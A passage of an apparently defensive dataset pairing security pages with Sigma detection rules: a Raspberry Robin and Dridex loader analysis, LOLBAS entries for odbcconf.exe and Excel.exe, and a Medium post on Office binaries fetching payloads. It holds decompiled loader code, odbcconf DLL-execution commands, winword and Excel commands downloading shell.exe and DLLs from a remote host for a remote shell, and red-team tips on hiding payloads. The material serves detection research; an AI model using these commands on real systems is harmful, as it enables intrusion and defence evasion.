RC4 function and sets structured values. The layout highlights the similarities in their coding structure, emphasizing the comparative analysis conducted on the two malware types.\nTranscription: |\n  Raspberry Robin Loader\n  leads_to_rc4_sub_40C450(base_encoded, base_encoded, size);\n  result = 0;\n  v9->encrypted_payload_offset = base_encoded + 0x3CB7;\n  v9->encrypted_payload_size = 0xB4000;\n  v9->payload_offset = base_encoded + 0x3CE;\n  v9->dwordC = 0x2290;\n  return result;\n  \n  Dridex Loader\n  rc4_start_sub_140011C20(v23, v23, v17); // Call RC4\n  result = 0x164;\n  v5 = v30 ^ 0x5ADF7B87;\n  *a1 = v23 + 0x3639; // Set struct values\n  v28 = 0xD84BB89C;\n  a1[1] = v5;\n  v29 ^= 0x4EEA020D6ui64;\n  a1[2] = v23 + 0x24;\n  a1[3] = v12;\n  return result;\n```\n\n*Figure 8 — Values assigned to a structure. The values represent the size and offset of the payload*\n\nThe PE header of the decrypted components is malformed in memory. As a result, the malware “fixes” the component to have the proper header by adding the “MZ (0x4D5A)” magic bytes to the header.\n\n```image\nAlt: Malformed header is patched with the appropriate values\nDescription: The image is a comparison of two code snippets, one from the Raspberry Robin loader and the other from the Dridex loader. Each snippet shows a function responsible for fixing the PE header of the respective malware. The Raspberry Robin loader's function initializes a PE header structure with specific magic numbers and values, while the Dridex loader's function performs a similar operation with slightly different syntax. The background is a light green color, and the code is formatted in a monospaced font, making it easy to read the technical details.\nTranscription: |\n  Raspberry Robin Loader\n  {\n      IMAGE_DOS_HEADER *_cdecl fix_header_sub_4011A0(_IMAGE_DOS_HEADER *PE_Hdr)\n      {\n          _IMAGE_DOS_HEADER *result; // eax\n  \n          PE_Hdr->e_magic = 0x5A4D;\n          PE_Hdr->e_lfanew = 0x0;\n          result = PE_Hdr;\n          *PE_Hdr[3].e_magic = 0x4550;\n          return result;\n      }\n  }\n  \n  Dridex Loader\n  {\n      int64 __fastcall fix_hdr_sub_1400013C0(IMAGE_DOS_HEADER *a1)\n      {\n          __int64 v2; // [rsp+0h] [rbp-8h]\n  \n          a1->e_magic = 0x5A4D;\n          a1->e_lfanew = 0xD8;\n          *&a1[3].pe_sig = 0x4550;\n          return 0x277705C7 * v2;\n      }\n  }\n```\n\n*Figure 9 — Malformed header is patched with the appropriate values*\n\n## Intermediate loader comparisons\n\nThe intermediate loaders between the two are similar containing code to perform hook detection in the *LdrLoadDll()* function. Detecting hooks in the function allows the malware to determine if the process is being monitored by antivirus software.\n\nThe final payload is also decoded using the algorithm represented by the following Python code:\n\n```\ndecrypted_payload = bytearray(payload)\nindex = 0\nsize = len(payload)\nwhile index != 254:\n    payload_idx = lookup_table[index*4]\n    while True:\n        if payload_idx >= size:\n            break\n        key_idx = payload_idx & 0x1F\n        key_byte = key[key_idx]\n        decrypted_byte = (payload[payload_idx] - key_byte) & 0xFF\n        decrypted_payload[payload_idx] = decrypted_byte\n        payload_idx += 0xFF\n    index += 1\n```\n\n## Recommendations\n\nIt is important to note that Raspberry Robin’s initial access is by the user plugging in an infected USB drive to a computer, which is a social engineering technique. The IBM Security MDR team tools effectively block Raspberry Robin. Further, there are multiple detection opportunities for Security professionals to help organizations to detect and prevent Raspberry Robin:\n\n- Implement security awareness training.\n- Search for the IOCs in your environment.\n- Install/Deploy EDR monitoring solutions.\n- Leverage your EDR solution to disable or track USB devices connections.\n- Disable the AutoRun feature in the Windows operating system settings.\n\n## IOCs\n\n### File hashes\n\n| Loader Variant                   | SHA256 Hash                                                      |\n| -------------------------------- | ---------------------------------------------------------------- |\n| Raspberry Robin Loader Variant 1 | c0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c |\n| Raspberry Robin Loader Variant 2 | 1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1 |\n| Dridex Loader                    | b30b76585ea225bdf8b4c6eedf4e6e99aff0cf8aac7cdf6fb1fa58b8bde68ab3 |\n\n### Command line\n\n```\nmsieXeC /q /I \"S8 [.]Cx:8080/random string/coMpUTErname=USER\"\n```",
    "sigma_rule": {
      "title": "Odbcconf.EXE Suspicious DLL Location",
      "id": "6b65c28e-11f3-46cb-902a-68f2cafaf474",
      "status": "test",
      "description": "Detects execution of \"odbcconf\" where the path of the DLL being registered is located in a potentially suspicious location.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html",
        "https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            ":\\PerfLogs\\",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Registration\\CRMLog",
            ":\\Windows\\System32\\com\\dmp\\",
            ":\\Windows\\System32\\FxsTmp\\",
            ":\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\",
            ":\\Windows\\System32\\spool\\drivers\\color\\",
            ":\\Windows\\System32\\spool\\PRINTERS\\",
            ":\\Windows\\System32\\spool\\SERVERS\\",
            ":\\Windows\\System32\\Tasks_Migrated\\",
            ":\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\SysWOW64\\com\\dmp\\",
            ":\\Windows\\SysWOW64\\FxsTmp\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            ":\\Windows\\Tracing\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_exec_susp_locations.yml",
    "id": "301"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe\n\nUsed in Windows for managing ODBC connections\n\n### Paths:\n- `C:\\Windows\\System32\\odbcconf.exe`\n- `C:\\Windows\\SysWOW64\\odbcconf.exe`\n\n### Resources:\n- https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b\n- https://github.com/woanware/application-restriction-bypasses\n- https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n\n### Detections:\n- Sigma: proc_creation_win_odbcconf_response_file.yml\n- Sigma: proc_creation_win_odbcconf_response_file_susp.yml\n- Elastic: defense_evasion_unusual_process_network_connection.toml\n- Elastic: defense_evasion_network_connection_from_windows_binary.toml\n\n## Execute\n\n1. **Execute DllREgisterServer from DLL specified.**\n\n   ```\n   odbcconf /a {REGSVR c:\\test\\test.dll}\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n2. **Install a driver and load the DLL. Requires administrator privileges.**\n\n   ```\n   odbcconf INSTALLDRIVER \"lolbas-project|Driver=c:\\test\\test.dll|APILevel=2\"\n   odbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n3. **Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.**\n\n   ```\n   odbcconf -f file.rsp\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** Administrator\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf",
    "sigma_rule": {
      "title": "Potentially Suspicious DLL Registered Via Odbcconf.EXE",
      "id": "ba4cfc11-d0fa-4d94-bf20-7c332c412e76",
      "related": [
        {
          "id": "9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"REGSVR\" action where the DLL in question doesn't contain a \".dll\" extension. Which is often used as a method to evade defenses.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "REGSVR "
        },
        "filter_main_dll_ext": {
          "CommandLine|contains": ".dll"
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_register_dll_regsvr_susp.yml",
    "id": "303"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe\n\nUsed in Windows for managing ODBC connections\n\n### Paths:\n- `C:\\Windows\\System32\\odbcconf.exe`\n- `C:\\Windows\\SysWOW64\\odbcconf.exe`\n\n### Resources:\n- https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b\n- https://github.com/woanware/application-restriction-bypasses\n- https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n\n### Detections:\n- Sigma: proc_creation_win_odbcconf_response_file.yml\n- Sigma: proc_creation_win_odbcconf_response_file_susp.yml\n- Elastic: defense_evasion_unusual_process_network_connection.toml\n- Elastic: defense_evasion_network_connection_from_windows_binary.toml\n\n## Execute\n\n1. **Execute DllREgisterServer from DLL specified.**\n\n   ```\n   odbcconf /a {REGSVR c:\\test\\test.dll}\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n2. **Install a driver and load the DLL. Requires administrator privileges.**\n\n   ```\n   odbcconf INSTALLDRIVER \"lolbas-project|Driver=c:\\test\\test.dll|APILevel=2\"\n   odbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n3. **Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.**\n\n   ```\n   odbcconf -f file.rsp\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** Administrator\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf",
    "sigma_rule": {
      "title": "Response File Execution Via Odbcconf.EXE",
      "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
      "related": [
        {
          "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
          "type": "similar"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.cybereason.com/blog/threat-analysis-report-bumblebee-loader-the-high-road-to-enterprise-domain-control",
        "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/"
      ],
      "author": "Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "selection_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "The rule is looking for any usage of response file, which might generate false positive when this function is used legitimately. Investigate the contents of the \".rsp\" file to determine if it is malicious and apply additional filters if necessary."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file.yml",
    "id": "306"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe\n\nUsed in Windows for managing ODBC connections\n\n### Paths:\n- `C:\\Windows\\System32\\odbcconf.exe`\n- `C:\\Windows\\SysWOW64\\odbcconf.exe`\n\n### Resources:\n- https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b\n- https://github.com/woanware/application-restriction-bypasses\n- https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n\n### Detections:\n- Sigma: proc_creation_win_odbcconf_response_file.yml\n- Sigma: proc_creation_win_odbcconf_response_file_susp.yml\n- Elastic: defense_evasion_unusual_process_network_connection.toml\n- Elastic: defense_evasion_network_connection_from_windows_binary.toml\n\n## Execute\n\n1. **Execute DllREgisterServer from DLL specified.**\n\n   ```\n   odbcconf /a {REGSVR c:\\test\\test.dll}\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n2. **Install a driver and load the DLL. Requires administrator privileges.**\n\n   ```\n   odbcconf INSTALLDRIVER \"lolbas-project|Driver=c:\\test\\test.dll|APILevel=2\"\n   odbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n3. **Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.**\n\n   ```\n   odbcconf -f file.rsp\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** Administrator\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf",
    "sigma_rule": {
      "title": "Suspicious Response File Execution Via Odbcconf.EXE",
      "id": "2d32dd6f-3196-4093-b9eb-1ad8ab088ca5",
      "related": [
        {
          "id": "5f03babb-12db-4eec-8c82-7b4cb5580868",
          "type": "derived"
        },
        {
          "id": "65d2be45-8600-4042-b4c0-577a1ff8a60e",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"odbcconf\" with the \"-f\" flag in order to load a response file with a non-\".rsp\" extension.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://www.trendmicro.com/en_us/research/17/h/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-22",
      "modified": "2024-03-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\odbcconf.exe"
          },
          {
            "OriginalFileName": "odbcconf.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -f "
        },
        "filter_main_rsp_ext": {
          "CommandLine|contains": ".rsp"
        },
        "filter_main_runonce_odbc": {
          "ParentImage": "C:\\Windows\\System32\\runonce.exe",
          "Image": "C:\\Windows\\System32\\odbcconf.exe",
          "CommandLine|contains": ".exe /E /F \"C:\\WINDOWS\\system32\\odbcconf.tmp\""
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_response_file_susp.yml",
    "id": "310"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
    "markdown": "# /Odbcconf.exe\n\nUsed in Windows for managing ODBC connections\n\n### Paths:\n- `C:\\Windows\\System32\\odbcconf.exe`\n- `C:\\Windows\\SysWOW64\\odbcconf.exe`\n\n### Resources:\n- https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b\n- https://github.com/woanware/application-restriction-bypasses\n- https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/\n\n### Detections:\n- Sigma: proc_creation_win_odbcconf_response_file.yml\n- Sigma: proc_creation_win_odbcconf_response_file_susp.yml\n- Elastic: defense_evasion_unusual_process_network_connection.toml\n- Elastic: defense_evasion_network_connection_from_windows_binary.toml\n\n## Execute\n\n1. **Execute DllREgisterServer from DLL specified.**\n\n   ```\n   odbcconf /a {REGSVR c:\\test\\test.dll}\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n2. **Install a driver and load the DLL. Requires administrator privileges.**\n\n   ```\n   odbcconf INSTALLDRIVER \"lolbas-project|Driver=c:\\test\\test.dll|APILevel=2\"\n   odbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** User\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf\n   - **Tags:** Execute: DLL\n\n3. **Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.**\n\n   ```\n   odbcconf -f file.rsp\n   ```\n\n   **Properties:**\n   - **Use case:** Execute dll file using technique that can evade defensive counter measures\n   - **Privileges required:** Administrator\n   - **Operating systems:** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique:** T1218.008: Odbcconf",
    "sigma_rule": {
      "title": "Uncommon Child Process Spawned By Odbcconf.EXE",
      "id": "8e3c7994-131e-4ba5-b6ea-804d49113a26",
      "status": "test",
      "description": "Detects an uncommon child process of \"odbcconf.exe\" binary which normally shouldn't have any child processes.",
      "references": [
        "https://learn.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-ver16",
        "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "https://medium.com/@cyberjyot/t1218-008-dll-execution-using-odbcconf-exe-803fa9e08dac"
      ],
      "author": "Harjot Singh @cyb3rjy0t",
      "date": "2023-05-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.008"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\odbcconf.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "In rare occurrences where \"odbcconf\" crashes. It might spawn a \"werfault\" process",
        "Other child processes will depend on the DLL being registered by actions like \"regsvr\". In case where the DLLs have external calls (which should be rare). Other child processes might spawn and additional filters need to be applied."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_odbcconf_uncommon_child_process.yml",
    "id": "313"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
    "markdown": "# /Excel.exe\n\nMicrosoft Office binary\n\n### Paths:\n- C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Excel.exe\n- C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Excel.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office16\\Excel.exe\n- C:\\Program Files\\Microsoft Office\\Office16\\Excel.exe\n- C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Excel.exe\n- C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Excel.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office15\\Excel.exe\n- C:\\Program Files\\Microsoft Office\\Office15\\Excel.exe\n- C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\Excel.exe\n- C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\Excel.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office14\\Excel.exe\n- C:\\Program Files\\Microsoft Office\\Office14\\Excel.exe\n- C:\\Program Files (x86)\\Microsoft Office\\Office12\\Excel.exe\n- C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe\n- C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe\n\n### Resources:\n- https://twitter.com/reegun21/status/1150032506504151040\n- https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191\n\n### Detections:\n- Sigma: proc_creation_win_lolbin_office.yml\n- IOC: Suspicious Office application Internet/network traffic\n\n## Download\n\n1. Downloads payload from remote server\n\n   ```\n   Excel.exe http://192.168.1.10/TeamsAddinLoader.dll\n   ```\n\n   **Use case**:\n   It will download a remote payload and place it in INetCache.\n\n   **Privileges required**:\n   User\n\n   **Operating systems**:\n   Windows\n\n   **ATT&CK® technique**:\n   T1105: Ingress Tool Transfer\n\n   **Tags**:\n   Download: INetCache\n   INetCache downloaders typically store files in a randomly-named folder under `%LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE`, having added `[1]` or a higher number between the file's name and its extension.\n   If you downloaded a file named `XYZ.exe`, the full path of the downloaded file can be obtained by executing the following command:\n\n   ```\n   cmd.exe /c \"where /r %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache XYZ*\"\n   ```",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml",
    "id": "317"
  },
  {
    "url": "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191",
    "markdown": "# Unsanitized file validation leads to Malicious payload download via Office binaries.\n\nUpdate 23-Sep-2019 — Added to Lolbas|Lolbin contribution.\n\nhttps://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/\nhttps://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/\nhttps://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/\n\nAs a part of finding vulnerable endpoints to improve defence, I used to reckon legitimate binaries on any chance of masking for payload download/execute.\n\nI focused my research towards Office binaries (winword/powerpnt/excel), My aim is to download a payload remotely via legitimate binaries by application whitelisting and execute via Office binaries.\n\nI came to know that we can able to open a remote document as Read-Only, I focused on that feature.\n\n## 1. Payload Download — No proper validation on remote files.\n\nI tried to download a remote file and it opens as Read-Only, but I wonder is there any cache stored locally?\n\n> winword.exe “http://192.168.1.10/test.docx”\n\nI fired up Procmon this time and look for artefacts and found the cache was stored on below 2 locations temporarily.\n\n> %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\Content.MSO\n> %localappdata%\\\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\[random folder]\n> %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\\n\nThis time I tried to download an executable and Winword.exe opens with scrambled strings.\n\n> winword.exe “http://192.168.1.10/shell.exe”\n\nI noticed the file was downloaded here %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\Content.MSO and deletes itself once the document closed, This is enough for an attacker to get the payload.\n\nI probed further and found the raw payload was stored in %localappdata%\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\[random folder]\\ as .EXE even after the document closed, Amazing!.\n\nUsing this method, an attacker will **mask the payload download** to evade defence mechanism especially **Application whitelisting**.\n\n## 2. Execute the payload in ‘Office’ way — used for defence evasion.\n\nI focused my research on how to execute payload with the help of Office binaries.\n\nThis time I downloaded a DLL.\n\n> winword.exe “http://192.168.1.10/TeamsAddinLoader.dll”\n\nOnce the DLL was downloaded, I probed possible ways to execute the DLL via Office binaries. As researched, there is a feature we can load Addins to Microsoft office.\n\nI load the DLL payload via Microsoft Office, Awesome again I got the remote shell. When I see the chain of events, **Winword.exe -> Rundll32 -> C2**, there is no initial visibility on command line that which file rundll32 loaded (Of course we can get those details by looking into memory).\n\n```image\nDescription: The image displays the properties window of the 'rundll32.exe' process on a Windows system. It shows the associated 'Image File' details, including the path to 'rundll32.exe', the command line being executed, and other process information. The left side of the image highlights 'winword.exe' and 'rundll32.exe', indicating a relationship between these processes, which is relevant to the discussed payload execution method. This context is important for understanding how Office binaries can be exploited to execute malicious DLLs.\nTranscription: |\n  rundll32.exe:4732 Properties\n  \n  Image File\n      Windows host process (Rundll32)\n      Microsoft Corporation\n      Version: 6.1.7600.16385\n      Build Time: Tue Jul 14 05:11:43 2009\n  \n  Path:\n      C:\\Windows\\SysWOW64\\rundll32.exe\n  \n  Command line:\n      rundll32.exe\n  \n  Current directory:\n      C:\\Users\\Jones\\Desktop\\\n  \n  Autostart Location:\n      n/a\n  \n  Processes:\n      vmtoolsd.exe\n      procexp64.exe\n      Procmon.exe\n      ProcessIdleRun.exe\n      rundll32.exe\n      ModelListener.exe\n```\n\n> Steps:\n> winword.exe -> file -> options -> Add-ins -> manage COM addins -> click GO -> add the dll.\n\nThe above 2 features indeed not a vulnerability, but the attackers can use windows legitimate binaries to download and execute the payload. This has been tracking as LOLBINS.\n\nhttps://youtu.be/yk3gKrgRVEE\n\nAs you can see above all payload download and execute are carried on via Office binaries.\n\nBut we can recommend Microsoft on first method “Payload Download” to stop downloading/opening when the file was not in supported format.\n\n### Recommendation to Blue/Red Team:\n\n**Blue Team:**\n\n- Always look for non-microsoft domain connections from Office binaries.\n- Investigate the executables which are written by Office binaries.\n- Respect your instinct on suspicious events.\n\n**Red Team:**\n\n- Download the file with document extensions.\n- Base64 the executable and download with document extensions.\n- Do the same as XOR’d.\n- Insert the base64 payload to original document.\n- Split the inserted payload to original document.\n- Password protect the Base64 embedded document.",
    "sigma_rule": {
      "title": "Potential Arbitrary File Download Using Office Application",
      "id": "4ae3e30b-b03f-43aa-87e3-b622f4048eed",
      "related": [
        {
          "id": "0c79148b-118e-472b-bdb7-9b57b444cc19",
          "type": "obsolete"
        }
      ],
      "status": "test",
